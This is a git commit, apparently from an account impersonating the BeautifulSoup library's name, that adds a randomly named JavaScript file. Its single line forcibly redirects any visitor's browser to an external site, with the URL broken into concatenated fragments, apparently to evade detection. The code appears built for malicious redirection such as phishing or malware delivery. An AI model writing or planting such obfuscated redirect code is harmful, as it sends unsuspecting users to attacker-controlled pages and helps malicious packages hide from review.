4ac764ac8aa5f49e6fbc5ca888ccb069779ea651
beautifulsoupz <77855946+pythonliss@users.noreply.github.com>
2022-12-01 14:37:16 +0100

    Create fsdfsafafawefffaefwefgdg.js

---
+++ fsdfsafafawefffaefwefgdg.js
@@ -0,0 +1,1 @@
+window.location.replace(``.concat(`ht`,`tps://www`,`.roadsworks.co`,`m/V0p0ljJEcXBBo`,`h1Zf2-7c`,`_o2-HNu60ZotOFsh`,`2r0AKrfQM9l2962`,`BugYspO8HIW-mkHZdl`,`rIaSRJG`,`BW6S`,`nl9og~~`))
